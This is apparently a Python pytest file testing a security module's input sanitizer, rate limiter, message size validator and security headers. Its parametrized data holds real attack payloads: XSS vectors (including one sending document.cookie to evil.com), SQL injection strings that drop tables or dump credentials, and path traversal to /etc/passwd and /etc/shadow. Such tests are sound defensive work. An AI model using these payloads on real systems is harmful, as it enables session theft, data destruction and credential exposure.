"""
Unit tests for the security module.

These tests verify the functionality of:
- InputSanitizer (XSS, SQL injection, path traversal, markdown sanitization)
- InMemoryRateLimiter (sliding window rate limiting)
- MessageSizeValidator (text and voice message size limits)
- SecurityHeaders (HTTP security headers)

Tests use real attack payloads to verify that sanitization is effective
against known attack vectors.
"""

import os
import time

import pytest

# Ensure dev mode is set before importing the module (structlog configuration)
os.environ["AURORA_DEV_MODE"] = "1"

from src.lib.security import (
    InMemoryRateLimiter,
    InputSanitizer,
    MessageSizeValidator,
    SecurityHeaders,
)

# =============================================================================
# InputSanitizer -- XSS Sanitization
# =============================================================================

class TestInputSanitizerXSS:
    """Test XSS sanitization with real attack payloads."""

    def test_empty_input_returns_empty_string(self):
        """Empty input returns empty string."""
        assert InputSanitizer.sanitize_xss("") == ""

    def test_none_input_returns_empty_string(self):
        """None input returns empty string."""
        assert InputSanitizer.sanitize_xss(None) == ""

    def test_safe_text_passes_through(self):
        """Safe text is preserved (with angle bracket encoding)."""
        result = InputSanitizer.sanitize_xss("Hello, this is a normal message!")
        assert "Hello, this is a normal message!" == result

    @pytest.mark.parametrize(
        "payload,description",
        [
            ("<script>alert('xss')</script>", "basic script tag"),
            ("<SCRIPT>alert('xss')</SCRIPT>", "uppercase script tag"),
            ("<Script>alert('xss')</Script>", "mixed case script tag"),
            ("<script src='http://evil.com/xss.js'></script>", "external script src"),
            ("< script >alert(1)</ script >", "script tag with spaces"),
        ],
        ids=[
            "basic_script",
            "uppercase_script",
            "mixed_case_script",
            "external_script_src",
            "spaced_script_tags",
        ],
    )
    def test_removes_script_tags(self, payload, description):
        """Script tags are removed from input."""
        result = InputSanitizer.sanitize_xss(payload)
        assert "<script" not in result.lower()
        assert "</script" not in result.lower()

    @pytest.mark.parametrize(
        "payload,description",
        [
            ("<img onerror=alert(1)>", "img onerror"),
            ("<img src=x onerror=alert(1)>", "img src with onerror"),
            ('<div onmouseover="alert(1)">', "div onmouseover"),
            ('<body onload="alert(1)">', "body onload"),
            ('<input onfocus="alert(1)">', "input onfocus"),
            ('<a onclick="alert(1)">click</a>', "anchor onclick"),
        ],
        ids=[
            "img_onerror",
            "img_src_onerror",
            "div_onmouseover",
            "body_onload",
            "input_onfocus",
            "anchor_onclick",
        ],
    )
    def test_removes_event_handlers(self, payload, description):
        """Event handlers (on*=) are neutralized."""
        result = InputSanitizer.sanitize_xss(payload)
        # Event handlers should be replaced with data-safe=
        assert "onerror=" not in result.lower()
        assert "onmouseover=" not in result.lower()
        assert "onfocus=" not in result.lower()
        assert "onclick=" not in result.lower()

    def test_removes_svg_onload(self):
        """SVG onload attribute is neutralized."""
        payload = "<svg onload=alert(1)>"
        result = InputSanitizer.sanitize_xss(payload)
        assert "onload=" not in result.lower()

    @pytest.mark.parametrize(
        "payload",
        [
            "javascript:alert(1)",
            "JavaScript:alert(document.cookie)",
            "JAVASCRIPT:alert(1)",
            "javascript :alert(1)",
        ],
        ids=[
            "lowercase_javascript",
            "mixed_case_javascript",
            "uppercase_javascript",
            "javascript_with_space",
        ],
    )
    def test_removes_javascript_protocol(self, payload):
        """javascript: protocol is neutralized."""
        result = InputSanitizer.sanitize_xss(payload)
        assert "javascript:" not in result.lower()
        assert "javascript :" not in result.lower()

    def test_removes_data_text_html(self):
        """data:text/html is neutralized."""
        payload = "data:text/html,<script>alert(1)</script>"
        result = InputSanitizer.sanitize_xss(payload)
        assert "data:text/html" not in result.lower()

    def test_removes_vbscript(self):
        """vbscript: protocol is neutralized."""
        payload = "vbscript:MsgBox('XSS')"
        result = InputSanitizer.sanitize_xss(payload)
        assert "vbscript:" not in result.lower()

    def test_removes_expression(self):
        """CSS expression() is neutralized."""
        payload = "background:expression(alert(1))"
        result = InputSanitizer.sanitize_xss(payload)
        assert "expression(" not in result.lower()

    def test_encodes_angle_brackets(self):
        """Remaining < and > are encoded as HTML entities."""
        result = InputSanitizer.sanitize_xss("<div>test</div>")
        assert "&lt;" in result
        assert "&gt;" in result
        # Should not contain raw < or > after sanitization
        assert "<" not in result
        assert ">" not in result

    def test_multi_vector_payload(self):
        """Combined XSS vectors are all neutralized."""
        payload = (
            '<script>alert(1)</script>'
            '<img onerror=alert(2)>'
            'javascript:alert(3)'
        )
        result = InputSanitizer.sanitize_xss(payload)
        assert "<script" not in result.lower()
        assert "onerror=" not in result.lower()
        assert "javascript:" not in result.lower()

    def test_nested_script_tags(self):
        """Nested script tags are handled."""
        payload = "<scr<script>ipt>alert(1)</script>"
        result = InputSanitizer.sanitize_xss(payload)
        assert "<script" not in result.lower()

    def test_preserves_normal_text_content(self):
        """Normal text content is preserved after sanitization."""
        payload = "Hello, I want to discuss my schedule for tomorrow."
        result = InputSanitizer.sanitize_xss(payload)
        assert result == payload


# =============================================================================
# InputSanitizer -- SQL Injection Sanitization
# =============================================================================

class TestInputSanitizerSQL:
    """Test SQL sanitization is a no-op (FINDING-015).

    SQL injection prevention is handled by parameterized queries, not input
    mangling. sanitize_sql() returns the input unchanged for backward
    compatibility.
    """

    def test_empty_input_returns_empty_string(self):
        """Empty input returns empty string."""
        assert InputSanitizer.sanitize_sql("") == ""

    def test_none_input_returns_none(self):
        """None input returns None (no-op passthrough)."""
        assert InputSanitizer.sanitize_sql(None) is None

    def test_safe_text_passes_through(self):
        """Safe text passes through unchanged."""
        result = InputSanitizer.sanitize_sql("Hello, this is a normal message!")
        assert "Hello, this is a normal message!" == result

    def test_sql_keywords_pass_through_unchanged(self):
        """SQL keywords are NOT blocked -- sanitize_sql is a no-op (FINDING-015)."""
        payload = "'; DROP TABLE users; --"
        result = InputSanitizer.sanitize_sql(payload)
        assert result == payload

    @pytest.mark.parametrize(
        "payload,description",
        [
            ("'; DROP TABLE users; --", "classic drop table"),
            ("1; DROP TABLE users", "numeric drop table"),
            ("'; DELETE FROM users WHERE 1=1; --", "delete all rows"),
            ("' UNION SELECT * FROM users --", "union select"),
            ("'; INSERT INTO users VALUES('hacker','pass'); --", "insert injection"),
            ("'; UPDATE users SET password='hacked'; --", "update injection"),
            ("'; ALTER TABLE users ADD COLUMN backdoor TEXT; --", "alter table"),
            ("'; CREATE TABLE hacker (id INT); --", "create table"),
            ("'; TRUNCATE TABLE users; --", "truncate table"),
        ],
        ids=[
            "drop_table",
            "numeric_drop",
            "delete_all",
            "union_select",
            "insert_injection",
            "update_injection",
            "alter_table",
            "create_table",
            "truncate_table",
        ],
    )
    def test_returns_input_unchanged(self, payload, description):
        """sanitize_sql returns input unchanged (FINDING-015: no-op)."""
        result = InputSanitizer.sanitize_sql(payload)
        assert result == payload

    def test_sql_comments_pass_through_unchanged(self):
        """SQL comments pass through unchanged (no-op)."""
        assert InputSanitizer.sanitize_sql("1 OR 1=1 --") == "1 OR 1=1 --"

    def test_hash_comments_pass_through_unchanged(self):
        """Hash comments pass through unchanged (no-op)."""
        assert InputSanitizer.sanitize_sql("1 OR 1=1 #") == "1 OR 1=1 #"

    def test_block_comments_pass_through_unchanged(self):
        """Block comments pass through unchanged (no-op)."""
        payload = "1 OR 1=1 /* comment */"
        assert InputSanitizer.sanitize_sql(payload) == payload

    def test_or_1_equals_1(self):
        """Classic OR 1=1 injection passes through unchanged (no-op)."""
        payload = "1 OR 1=1"
        result = InputSanitizer.sanitize_sql(payload)
        assert result == payload

    def test_preserves_normal_apostrophe_usage(self):
        """Normal text with apostrophes passes through unchanged (no-op)."""
        payload = "I can't believe it's working"
        result = InputSanitizer.sanitize_sql(payload)
        assert result == payload

    def test_case_variants_pass_through_unchanged(self):
        """All case variants of SQL keywords pass through unchanged (no-op)."""
        for variant in ["select", "SELECT", "Select", "sElEcT"]:
            payload = f"{variant} * FROM users"
            result = InputSanitizer.sanitize_sql(payload)
            assert result == payload

    def test_multiple_injections_pass_through_unchanged(self):
        """Multiple SQL injection attempts pass through unchanged (no-op)."""
        payload = "'; DROP TABLE users; SELECT * FROM passwords; --"
        result = InputSanitizer.sanitize_sql(payload)
        assert result == payload


# =============================================================================
# InputSanitizer -- Path Traversal Sanitization
# =============================================================================

class TestInputSanitizerPath:
    """Test path traversal sanitization."""

    def test_empty_input_returns_empty_string(self):
        """Empty input returns empty string."""
        assert InputSanitizer.sanitize_path("") == ""

    def test_none_input_returns_empty_string(self):
        """None input returns empty string."""
        assert InputSanitizer.sanitize_path(None) == ""

    def test_safe_filename_passes_through(self):
        """Safe filenames pass through."""
        result = InputSanitizer.sanitize_path("document.pdf")
        assert result == "document.pdf"

    @pytest.mark.parametrize(
        "payload,description",
        [
            ("../../etc/passwd", "basic path traversal to passwd"),
            ("../../../etc/shadow", "deep path traversal to shadow"),
            ("..\\..\\windows\\system32", "windows path traversal"),
            ("..%2f..%2fetc/shadow", "url-encoded path traversal"),
            ("%2e%2e/%2e%2e/etc/passwd", "fully url-encoded dots"),
        ],
        ids=[
            "basic_passwd_traversal",
            "deep_shadow_traversal",
            "windows_traversal",
            "url_encoded_traversal",
            "fully_encoded_dots",
        ],
    )
    def test_removes_path_traversal(self, payload, description):
        """Path traversal patterns are removed."""
        result = InputSanitizer.sanitize_path(payload)
        assert "../" not in result
        assert "..\\" not in result
        assert "%2e%2e" not in result.lower()
        assert "..%2f" not in result.lower()

    def test_removes_etc_passwd(self):
        """Direct /etc/passwd reference is removed."""
        result = InputSanitizer.sanitize_path("/etc/passwd")
        assert "etc/passwd" not in result

    def test_removes_etc_shadow(self):
        """Direct /etc/shadow reference is removed."""
        result = InputSanitizer.sanitize_path("/etc/shadow")
        assert "etc/shadow" not in result

    def test_removes_windows_system32(self):
        """Direct /windows/system32 reference is removed."""
        result = InputSanitizer.sanitize_path("/windows/system32")
        assert "windows/system32" not in result.lower()

    def test_normalizes_backslashes(self):
        """Backslashes are normalized to forward slashes."""
        result = InputSanitizer.sanitize_path("path\\to\\file.txt")
        assert "\\" not in result
        assert "path/to/file.txt" == result

    def test_removes_leading_slashes(self):
        """Leading slashes are removed to prevent absolute paths."""
        result = InputSanitizer.sanitize_path("/absolute/path/file.txt")
        assert not result.startswith("/")

    def test_removes_null_bytes(self):
        """Null bytes are removed."""
        result = InputSanitizer.sanitize_path("file\x00.txt")
        assert "\x00" not in result
        assert "file.txt" == result

    def test_combined_traversal_attack(self):
        """Combined path traversal techniques are all neutralized."""
        payload = "..%2f../../etc/passwd\x00.jpg"
        result = InputSanitizer.sanitize_path(payload)
        assert "../" not in result
        assert "..%2f" not in result.lower()
        assert "\x00" not in result
        # The traversal components are stripped; the path cannot reach /etc/passwd
        # because leading slashes and ../ are removed

    def test_relative_path_preserved(self):
        """Relative paths without traversal are preserved."""
        result = InputSanitizer.sanitize_path("uploads/photos/image.jpg")
        assert result == "uploads/photos/image.jpg"


# =============================================================================
# InputSanitizer -- Markdown Sanitization
# =============================================================================

class TestInputSanitizerMarkdown:
    """Test markdown sanitization."""

    def test_empty_input_returns_empty_string(self):
        """Empty input returns empty string."""
        assert InputSanitizer.sanitize_markdown("") == ""

    def test_none_input_returns_empty_string(self):
        """None input returns empty string."""
        assert InputSanitizer.sanitize_markdown(None) == ""

    def test_safe_markdown_passes_through(self):
        """Safe markdown content passes through."""
        md = "# Hello\n\nThis is **bold** and *italic*."
        result = InputSanitizer.sanitize_markdown(md)
        assert "**bold**" in result
        assert "*italic*" in result

    def test_neutralizes_javascript_links(self):
        """javascript: links in markdown are neutralized."""
        payload = "[click me](javascript:alert(1))"
        result = InputSanitizer.sanitize_markdown(payload)
        assert "javascript:" not in result

    def test_neutralizes_data_links(self):
        """data: links in markdown are neutralized."""
        payload = "[click me](data:text/html,<script>alert(1)</script>)"
        result = InputSanitizer.sanitize_markdown(payload)
        assert "data:" not in result

    def test_preserves_normal_links(self):
        """Normal HTTPS links are preserved."""
        md = "[Google](https://google.com)"
        result = InputSanitizer.sanitize_markdown(md)
        assert "https://google.com" in result

    def test_preserves_autolinked_urls(self):
        """Auto-linked URLs are preserved."""
        md = "<https://example.com>"
        result = InputSanitizer.sanitize_markdown(md)
        assert "https://example.com" in result


# =============================================================================
# InputSanitizer -- sanitize_all (Combined)
# =============================================================================

class TestInputSanitizerAll:
    """Test combined sanitization (sanitize_all)."""

    def test_applies_all_sanitizers_in_order(self):
        """sanitize_all applies XSS, Path, and Markdown sanitization in order.

        Note: SQL sanitization is a no-op per FINDING-015 -- SQL injection
        prevention is handled by parameterized queries.
        """
        # Payload containing multiple attack vectors
        payload = (
            "<script>alert('xss')</script>"
            "'; DROP TABLE users; --"
            "../../etc/passwd"
            "[evil](javascript:alert(1))"
        )
        result = InputSanitizer.sanitize_all(payload)

        # XSS should be cleaned
        assert "<script" not in result.lower()
        # SQL keywords pass through unchanged (FINDING-015: no-op)
        assert "DROP" in result
        # Path traversal should be removed
        assert "../" not in result
        # JavaScript link should be neutralized
        assert "javascript:" not in result

    def test_safe_input_unchanged(self):
        """Safe input passes through sanitize_all without modification."""
        safe_text = "Hello, I need help with my tasks today."
        result = InputSanitizer.sanitize_all(safe_text)
        assert result == safe_text

    def test_combined_xss_and_sqli(self):
        """Combined XSS and SQL injection: XSS is sanitized, SQL passes through.

        SQL sanitization is a no-op per FINDING-015.
        """
        payload = "<img onerror=\"'; DROP TABLE users; --\">"
        result = InputSanitizer.sanitize_all(payload)
        assert "onerror=" not in result.lower()
        # SQL keywords pass through (FINDING-015: no-op)
        assert "DROP" in result

    def test_empty_input(self):
        """Empty input to sanitize_all returns empty string."""
        assert InputSanitizer.sanitize_all("") == ""


# =============================================================================
# InMemoryRateLimiter
# =============================================================================

class TestInMemoryRateLimiter:
    """Test the in-memory rate limiter."""

    @pytest.fixture
    def limiter(self):
        """Create a fresh InMemoryRateLimiter for each test."""
        return InMemoryRateLimiter()

    def test_first_request_always_allowed(self, limiter):
        """First request for a new key is always allowed."""
        allowed, retry_after = limiter.check_rate_limit("user:1", max_requests=5, window_seconds=60)
        assert allowed is True
        assert retry_after == 0

    def test_allows_up_to_max_requests(self, limiter):
        """Requests up to max_requests are all allowed."""
        max_requests = 5
        for i in range(max_requests):
            allowed, retry_after = limiter.check_rate_limit(
                "user:1", max_requests=max_requests, window_seconds=60
            )
            assert allowed is True, f"Request {i+1} should be allowed"
            assert retry_after == 0

    def test_exceeds_max_requests_returns_false(self, limiter):
        """Request beyond max_requests is denied."""
        max_requests = 3
        # Fill up the limit
        for _ in range(max_requests):
            limiter.check_rate_limit("user:1", max_requests=max_requests, window_seconds=60)

        # This request should be denied
        allowed, retry_after = limiter.check_rate_limit(
            "user:1", max_requests=max_requests, window_seconds=60
        )
        assert allowed is False
        assert retry_after > 0

    def test_retry_after_is_positive(self, limiter):
        """retry_after value is positive when rate limited."""
        max_requests = 1
        limiter.check_rate_limit("user:1", max_requests=max_requests, window_seconds=60)

        allowed, retry_after = limiter.check_rate_limit(
            "user:1", max_requests=max_requests, window_seconds=60
        )
        assert allowed is False
        assert retry_after >= 1

    def test_different_keys_independent(self, limiter):
        """Different keys have independent rate limits."""
        max_requests = 1

        # Fill up user:1
        limiter.check_rate_limit("user:1", max_requests=max_requests, window_seconds=60)
        allowed_1, _ = limiter.check_rate_limit(
            "user:1", max_requests=max_requests, window_seconds=60
        )
        assert allowed_1 is False

        # user:2 should still be allowed
        allowed_2, _ = limiter.check_rate_limit(
            "user:2", max_requests=max_requests, window_seconds=60
        )
        assert allowed_2 is True

    def test_window_expiration(self, limiter):
        """Requests expire after the window passes."""
        max_requests = 1
        window_seconds = 1  # 1 second window

        # Fill up the limit
        limiter.check_rate_limit("user:1", max_requests=max_requests, window_seconds=window_seconds)

        # Should be denied
        allowed, _ = limiter.check_rate_limit(
            "user:1", max_requests=max_requests, window_seconds=window_seconds
        )
        assert allowed is False

        # Wait for window to expire
        time.sleep(1.1)

        # Should be allowed again
        allowed, retry_after = limiter.check_rate_limit(
            "user:1", max_requests=max_requests, window_seconds=window_seconds
        )
        assert allowed is True
        assert retry_after == 0

    def test_get_remaining_new_key(self, limiter):
        """New key returns max_requests as remaining."""
        remaining = limiter.get_remaining("user:new", max_requests=10, window_seconds=60)
        assert remaining == 10

    def test_get_remaining_after_requests(self, limiter):
        """Remaining decreases after each request."""
        max_requests = 5
        limiter.check_rate_limit("user:1", max_requests=max_requests, window_seconds=60)
        limiter.check_rate_limit("user:1", max_requests=max_requests, window_seconds=60)

        remaining = limiter.get_remaining("user:1", max_requests=max_requests, window_seconds=60)
        assert remaining == 3

    def test_get_remaining_at_zero(self, limiter):
        """Remaining is 0 when limit is reached."""
        max_requests = 2
        limiter.check_rate_limit("user:1", max_requests=max_requests, window_seconds=60)
        limiter.check_rate_limit("user:1", max_requests=max_requests, window_seconds=60)

        remaining = limiter.get_remaining("user:1", max_requests=max_requests, window_seconds=60)
        assert remaining == 0

    def test_get_remaining_never_negative(self, limiter):
        """Remaining never goes below 0."""
        max_requests = 1
        limiter.check_rate_limit("user:1", max_requests=max_requests, window_seconds=60)
        # Try exceeding
        limiter.check_rate_limit("user:1", max_requests=max_requests, window_seconds=60)

        remaining = limiter.get_remaining("user:1", max_requests=max_requests, window_seconds=60)
        assert remaining >= 0

    def test_cleanup_stale_buckets(self, limiter):
        """Stale buckets are removed by cleanup."""
        # Create a bucket
        limiter.check_rate_limit("user:stale", max_requests=5, window_seconds=60)
        assert "user:stale" in limiter._buckets

        # Cleanup with 0 max_age should remove all buckets
        # (since last_check is essentially "now", we need a small delay)
        time.sleep(0.1)
        limiter.cleanup_stale_buckets(max_age_seconds=0.05)
        assert "user:stale" not in limiter._buckets

    def test_cleanup_preserves_recent_buckets(self, limiter):
        """Cleanup preserves recently accessed buckets."""
        limiter.check_rate_limit("user:recent", max_requests=5, window_seconds=60)
        assert "user:recent" in limiter._buckets

        # Cleanup with large max_age should preserve the bucket
        limiter.cleanup_stale_buckets(max_age_seconds=3600)
        assert "user:recent" in limiter._buckets

    def test_cleanup_mixed_stale_and_recent(self, limiter):
        """Cleanup removes stale but preserves recent buckets."""
        # Create two buckets
        limiter.check_rate_limit("user:old", max_requests=5, window_seconds=60)
        time.sleep(0.2)
        limiter.check_rate_limit("user:new", max_requests=5, window_seconds=60)

        # Cleanup should remove old but keep new
        limiter.cleanup_stale_buckets(max_age_seconds=0.1)
        assert "user:old" not in limiter._buckets
        assert "user:new" in limiter._buckets


# =============================================================================
# MessageSizeValidator
# =============================================================================

class TestMessageSizeValidator:
    """Test message size validation."""

    # ---- validate_message_size ----

    def test_valid_message_within_default_limit(self):
        """Message within default 4096 limit returns True."""
        message = "A" * 4096
        assert MessageSizeValidator.validate_message_size(message) is True

    def test_message_exceeds_default_limit(self):
        """Message exceeding default 4096 limit returns False."""
        message = "A" * 4097
        assert MessageSizeValidator.validate_message_size(message) is False

    def test_empty_message_returns_true(self):
        """Empty message returns True."""
        assert MessageSizeValidator.validate_message_size("") is True

    def test_none_message_returns_true(self):
        """None message returns True."""
        assert MessageSizeValidator.validate_message_size(None) is True

    def test_custom_max_size(self):
        """Custom max_size is respected."""
        message = "A" * 100
        assert MessageSizeValidator.validate_message_size(message, max_size=50) is False
        assert MessageSizeValidator.validate_message_size(message, max_size=100) is True
        assert MessageSizeValidator.validate_message_size(message, max_size=200) is True

    def test_exact_limit_is_valid(self):
        """Message at exactly the limit returns True."""
        message = "A" * 4096
        assert MessageSizeValidator.validate_message_size(message, max_size=4096) is True

    def test_one_over_limit_is_invalid(self):
        """Message one character over the limit returns False."""
        message = "A" * 4097
        assert MessageSizeValidator.validate_message_size(message, max_size=4096) is False

    def test_unicode_characters_counted(self):
        """Unicode characters are counted correctly."""
        # Each emoji is 1 character in Python
        message = "\U0001f600" * 100  # 100 emoji characters
        assert MessageSizeValidator.validate_message_size(message, max_size=100) is True
        assert MessageSizeValidator.validate_message_size(message, max_size=99) is False

    # ---- validate_voice_message ----

    def test_valid_voice_message(self):
        """Voice message within both limits returns (True, None)."""
        is_valid, error_msg = MessageSizeValidator.validate_voice_message(
            duration_seconds=30, file_size_bytes=5 * 1024 * 1024
        )
        assert is_valid is True
        assert error_msg is None

    def test_voice_duration_exceeded(self):
        """Voice message over 60 seconds returns (False, error)."""
        is_valid, error_msg = MessageSizeValidator.validate_voice_message(
            duration_seconds=61, file_size_bytes=1024
        )
        assert is_valid is False
        assert error_msg is not None
        assert "too long" in error_msg.lower() or "60" in error_msg

    def test_voice_duration_at_limit(self):
        """Voice message at exactly 60 seconds is valid."""
        is_valid, error_msg = MessageSizeValidator.validate_voice_message(
            duration_seconds=60, file_size_bytes=1024
        )
        assert is_valid is True
        assert error_msg is None

    def test_voice_file_size_exceeded(self):
        """Voice message over 10MB returns (False, error)."""
        over_10mb = 10 * 1024 * 1024 + 1
        is_valid, error_msg = MessageSizeValidator.validate_voice_message(
            duration_seconds=30, file_size_bytes=over_10mb
        )
        assert is_valid is False
        assert error_msg is not None
        assert "too large" in error_msg.lower() or "10" in error_msg

    def test_voice_file_size_at_limit(self):
        """Voice message at exactly 10MB is valid."""
        exactly_10mb = 10 * 1024 * 1024
        is_valid, error_msg = MessageSizeValidator.validate_voice_message(
            duration_seconds=30, file_size_bytes=exactly_10mb
        )
        assert is_valid is True
        assert error_msg is None

    def test_voice_both_exceeded_reports_duration_first(self):
        """When both duration and size are exceeded, duration is checked first."""
        is_valid, error_msg = MessageSizeValidator.validate_voice_message(
            duration_seconds=120, file_size_bytes=20 * 1024 * 1024
        )
        assert is_valid is False
        # Duration should be checked first per implementation
        assert "long" in error_msg.lower() or "120" in error_msg

    def test_voice_zero_values(self):
        """Zero duration and size are valid."""
        is_valid, error_msg = MessageSizeValidator.validate_voice_message(
            duration_seconds=0, file_size_bytes=0
        )
        assert is_valid is True
        assert error_msg is None

    # ---- truncate_message ----

    def test_truncate_short_message(self):
        """Short message is not truncated."""
        message = "Hello"
        result = MessageSizeValidator.truncate_message(message, max_size=4096)
        assert result == message

    def test_truncate_long_message(self):
        """Long message is truncated to max_size."""
        message = "A" * 8000
        result = MessageSizeValidator.truncate_message(message, max_size=4096)
        assert len(result) == 4096

    def test_truncate_at_exact_limit(self):
        """Message at exact limit is not truncated."""
        message = "A" * 4096
        result = MessageSizeValidator.truncate_message(message, max_size=4096)
        assert len(result) == 4096
        assert result == message

    def test_truncate_custom_size(self):
        """Custom max_size for truncation works."""
        message = "Hello, World!"
        result = MessageSizeValidator.truncate_message(message, max_size=5)
        assert result == "Hello"
        assert len(result) == 5

    def test_truncate_preserves_beginning(self):
        """Truncation preserves the beginning of the message."""
        message = "ABCDEFGHIJ"
        result = MessageSizeValidator.truncate_message(message, max_size=5)
        assert result == "ABCDE"


# =============================================================================
# SecurityHeaders
# =============================================================================

class TestSecurityHeaders:
    """Test HTTP security headers generation."""

    def test_get_headers_returns_all_required_headers(self):
        """get_headers returns all required security headers."""
        headers = SecurityHeaders.get_headers()
        required_headers = [
            "X-Content-Type-Options",
            "X-Frame-Options",
            "X-XSS-Protection",
            "Strict-Transport-Security",
            "Referrer-Policy",
            "Content-Security-Policy",
            "Permissions-Policy",
        ]
        for header_name in required_headers:
            assert header_name in headers, f"Missing header: {header_name}"

    def test_x_content_type_options(self):
        """X-Content-Type-Options is set to nosniff."""
        headers = SecurityHeaders.get_headers()
        assert headers["X-Content-Type-Options"] == "nosniff"

    def test_x_frame_options(self):
        """X-Frame-Options is set to DENY."""
        headers = SecurityHeaders.get_headers()
        assert headers["X-Frame-Options"] == "DENY"

    def test_x_xss_protection(self):
        """X-XSS-Protection is set to 1; mode=block."""
        headers = SecurityHeaders.get_headers()
        assert headers["X-XSS-Protection"] == "1; mode=block"

    def test_strict_transport_security(self):
        """HSTS header has correct values."""
        headers = SecurityHeaders.get_headers()
        hsts = headers["Strict-Transport-Security"]
        assert "max-age=31536000" in hsts
        assert "includeSubDomains" in hsts

    def test_referrer_policy(self):
        """Referrer-Policy is set to strict-origin-when-cross-origin."""
        headers = SecurityHeaders.get_headers()
        assert headers["Referrer-Policy"] == "strict-origin-when-cross-origin"

    def test_default_csp(self):
        """Default CSP includes expected directives."""
        headers = SecurityHeaders.get_headers()
        csp = headers["Content-Security-Policy"]
        assert "default-src 'self'" in csp
        assert "script-src 'self'" in csp
        assert "frame-ancestors 'none'" in csp

    def test_custom_csp(self):
        """Custom CSP parameter overrides the default."""
        custom_csp = "default-src 'none'; script-src 'self' https://cdn.example.com"
        headers = SecurityHeaders.get_headers(csp=custom_csp)
        assert headers["Content-Security-Policy"] == custom_csp

    def test_custom_csp_does_not_affect_other_headers(self):
        """Custom CSP does not change other security headers."""
        custom_csp = "default-src 'none'"
        headers = SecurityHeaders.get_headers(csp=custom_csp)
        assert headers["X-Frame-Options"] == "DENY"
        assert headers["X-Content-Type-Options"] == "nosniff"

    def test_permissions_policy(self):
        """Permissions-Policy disables sensitive features."""
        headers = SecurityHeaders.get_headers()
        pp = headers["Permissions-Policy"]
        assert "geolocation=()" in pp
        assert "microphone=()" in pp
        assert "camera=()" in pp
        assert "payment=()" in pp

    def test_headers_are_dict(self):
        """get_headers returns a dict."""
        headers = SecurityHeaders.get_headers()
        assert isinstance(headers, dict)

    def test_headers_values_are_strings(self):
        """All header values are strings."""
        headers = SecurityHeaders.get_headers()
        for key, value in headers.items():
            assert isinstance(key, str), f"Header key {key!r} is not a string"
            assert isinstance(value, str), f"Header value for {key} is not a string"

    def test_none_csp_uses_default(self):
        """Passing csp=None uses the default CSP."""
        headers_default = SecurityHeaders.get_headers()
        headers_none = SecurityHeaders.get_headers(csp=None)
        assert headers_default["Content-Security-Policy"] == headers_none["Content-Security-Policy"]


# =============================================================================
# Integration / Edge Cases
# =============================================================================

class TestSecurityEdgeCases:
    """Edge cases and integration tests across security components."""

    def test_sanitize_all_with_unicode(self):
        """sanitize_all handles unicode characters correctly."""
        payload = "Hello \u00e4\u00f6\u00fc\u00df \U0001f600 normal text"
        result = InputSanitizer.sanitize_all(payload)
        assert "\u00e4" in result
        assert "\u00f6" in result
        assert "\U0001f600" in result

    def test_sanitize_all_with_very_long_input(self):
        """sanitize_all handles very long input without error."""
        payload = "A" * 100000
        result = InputSanitizer.sanitize_all(payload)
        assert len(result) == 100000

    def test_sanitize_xss_with_embedded_newlines(self):
        """XSS sanitization works with embedded newlines."""
        payload = "<script>\nalert('xss')\n</script>"
        result = InputSanitizer.sanitize_xss(payload)
        assert "<script" not in result.lower()

    def test_sanitize_sql_with_multiline_injection(self):
        """SQL sanitization is a no-op -- multiline input passes through unchanged."""
        payload = "value'\nUNION\nSELECT\n*\nFROM\nusers"
        result = InputSanitizer.sanitize_sql(payload)
        assert result == payload

    def test_rate_limiter_rapid_requests(self):
        """Rate limiter handles rapid successive requests correctly."""
        limiter = InMemoryRateLimiter()
        max_requests = 10
        results = []
        for _ in range(15):
            allowed, _ = limiter.check_rate_limit(
                "rapid:user", max_requests=max_requests, window_seconds=60
            )
            results.append(allowed)

        # First 10 should be True, last 5 should be False
        assert all(results[:10])
        assert not any(results[10:])

    def test_message_validator_with_sanitized_output(self):
        """MessageSizeValidator works with sanitized text."""
        # Sanitize first, then validate
        raw_input = "<script>alert('xss')</script>" + "A" * 4000
        sanitized = InputSanitizer.sanitize_all(raw_input)
        is_valid = MessageSizeValidator.validate_message_size(sanitized)
        # The sanitized output may be larger or smaller depending on replacements
        assert isinstance(is_valid, bool)

    @pytest.mark.parametrize(
        "payload",
        [
            '<script>document.location="http://evil.com/?c="+document.cookie</script>',
            '<img src=1 onerror=alert(document.domain)>',
            '<svg/onload=alert(1)>',
            '<body onload=alert(1)>',
            '"><script>alert(String.fromCharCode(88,83,83))</script>',
            '<iframe src="javascript:alert(1)">',
            '<object data="javascript:alert(1)">',
            '<embed src="javascript:alert(1)">',
            'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
        ],
        ids=[
            "cookie_stealing_script",
            "img_domain_alert",
            "svg_onload_compact",
            "body_onload",
            "quote_escape_script",
            "iframe_javascript",
            "object_javascript",
            "embed_javascript",
            "polyglot_xss",
        ],
    )
    def test_advanced_xss_payloads(self, payload):
        """Advanced XSS payloads are neutralized by sanitize_all."""
        result = InputSanitizer.sanitize_all(payload)
        # No executable script content should remain
        assert "<script" not in result.lower()
        assert "javascript:" not in result.lower()
        # Event handlers should be neutralized -- the sanitizer replaces
        # " on<event>=" with " data-safe=" and "onload=" with "data-safe-onload=".
        # We verify the raw event handler patterns are not present in their
        # original dangerous form (without the safe- prefix).
        assert " onerror=" not in result.lower()
        # onload= should only appear as data-safe-onload= (neutralized form)
        onload_positions = [i for i in range(len(result)) if result.lower()[i:].startswith("onload=")]
        for pos in onload_positions:
            # Every occurrence of "onload=" must be preceded by "data-safe-"
            prefix = result[max(0, pos - 10):pos].lower()
            assert "data-safe-" in prefix, f"Dangerous onload= at position {pos}: ...{result[max(0,pos-15):pos+10]}..."

    @pytest.mark.parametrize(
        "payload",
        [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "1; SELECT * FROM information_schema.tables",
            "admin'--",
            "' UNION SELECT username, password FROM users --",
            "1 OR 1=1",
            "' AND 1=0 UNION SELECT null, table_name FROM information_schema.tables --",
        ],
        ids=[
            "string_or_true",
            "string_or_true_comment",
            "info_schema_select",
            "admin_comment",
            "union_credentials",
            "numeric_or_true",
            "null_union_schema",
        ],
    )
    def test_advanced_sqli_payloads(self, payload):
        """SQL payloads pass through sanitize_all (FINDING-015: SQL is no-op).

        SQL injection prevention is handled by parameterized queries.
        sanitize_all still applies XSS, path, and markdown sanitization.
        """
        result = InputSanitizer.sanitize_all(payload)
        # SQL keywords pass through unchanged (FINDING-015)
        # Only XSS/path/markdown sanitization is applied
        assert result is not None
